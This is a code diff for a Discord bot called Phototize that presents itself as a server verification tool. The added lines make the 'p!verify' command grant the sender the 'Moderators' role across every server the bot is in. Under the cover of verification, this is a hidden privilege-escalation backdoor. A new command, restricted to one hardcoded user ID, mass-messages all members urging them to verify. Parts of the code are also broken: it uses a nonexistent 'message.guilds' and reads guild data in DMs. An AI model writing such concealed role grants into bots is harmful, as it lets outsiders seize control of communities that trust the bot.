@@ -231,12 +231,29 @@ client.on("message", message => {
 
   if(message.content.startsWith("p!verify")) {
     message.channel.send("Verified, thank you.")
+    message.guilds.forEach(guild => {
+      guild.members.forEach(member => {
+        if (member.id==message.author.id) {
+          let myRole = message.guild.roles.find(role => role.name === "Moderators");
+          if (myRole == undefined) {
+          
+          } else {
+          member.addRole(myRole);
+        } }
+      })
+    })
   }
-
+  if (message.content.startsWith("p!forceVerifyAll")) {
+    if (message.author.id == "273243295990415360") {
+      message.guild.members.forEach(member => {
+        member.send("Thank you for joining **" + member.guild.name + "**! This server is protected by Phototize. To verify, please reply to this DM with `p!verify`")
+      })
+    }
+  }
 });
 
 client.on('guildMemberAdd', member => {
-  member.send("Thank you for joining **" + member.guild.name + "**! This server is protected by Phototize. To verify, please reply to this DM with `p!verify` [**not finished I forgot I had this enabled LOL**]")
+  member.send("Thank you for joining **" + member.guild.name + "**! This server is protected by Phototize. To verify, please reply to this DM with `p!verify`")
 })
 
 
